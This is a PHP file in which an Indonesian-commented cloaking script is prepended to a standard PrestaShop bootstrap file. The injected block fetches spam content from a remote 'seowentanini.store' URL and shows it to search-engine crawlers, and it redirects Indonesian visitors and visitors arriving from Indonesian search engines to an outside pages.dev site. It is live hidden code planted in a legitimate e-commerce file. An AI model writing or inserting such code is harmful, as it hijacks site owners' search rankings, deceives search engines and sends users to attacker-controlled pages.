<?php
// Header untuk caching berdasarkan bahasa dan user-agent
header('Vary: Accept-Language, User-Agent');

// Fungsi untuk mengambil data dari URL menggunakan file_get_contents atau cURL
function make_request($url) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false; // URL tidak valid
    }
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

// Fungsi untuk mendapatkan IP pengguna
function get_client_ip() {
    return $_SERVER['HTTP_CLIENT_IP'] 
        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        ?? $_SERVER['REMOTE_ADDR'] 
        ?? '127.0.0.1';
}

// Mendapatkan informasi dasar
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = $_SERVER["HTTP_REFERER"] ?? '';
$ip = get_client_ip();

// URL untuk file bot dan redirect
$bot_url = "https://seowentanini.store/cloaking/ukrlinen.txt";
$reff_url = "https://ukrlinen.pages.dev/";

// Ambil file dari URL bot
$file = make_request($bot_url);

// Ambil informasi geolokasi berdasarkan IP
$geolocation = @json_decode(make_request("http://ip-api.com/json/{$ip}"), true);
$cc = $geolocation['countryCode'] ?? ''; // Kode negara

// Pola regex untuk mendeteksi bot
$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|crawler|bot)/i";

// Deteksi bot berdasarkan User-Agent
if (preg_match($botchar, $ua)) {
    // Jika bot terdeteksi, tampilkan file khusus
    echo $file;
    exit;
}

// Redirect untuk pengguna dari Indonesia
if ($cc === "ID") {
    header("HTTP/1.1 302 Found");
    header("Location: " . $reff_url);
    exit();
}

// Redirect berdasarkan referer dari mesin pencari populer di Indonesia
$allowed_referers = ["google.co.id", "yahoo.co.id", "bing.com"];
foreach ($allowed_referers as $referer) {
    if (stripos($rf, $referer) !== false) {
        header("HTTP/1.1 302 Found");
        header("Location: " . $reff_url);
        exit();
    }
}

// Jika tidak ada kondisi yang terpenuhi, lanjutkan eksekusi biasa
?>

<?php
/**
 * 2007-2019 PrestaShop and Contributors
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://www.prestashop.com for more information.
 *
 * @author    PrestaShop SA <contact@prestashop.com>
 * @copyright 2007-2019 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 * International Registered Trademark & Property of PrestaShop SA
 */
require_once __DIR__.'/../vendor/autoload.php';

define('_PS_VERSION_', AppKernel::VERSION);

require_once _PS_CONFIG_DIR_.'alias.php';
require_once _PS_CLASS_DIR_.'PrestaShopAutoload.php';
spl_autoload_register(array(PrestaShopAutoload::getInstance(), 'load'));
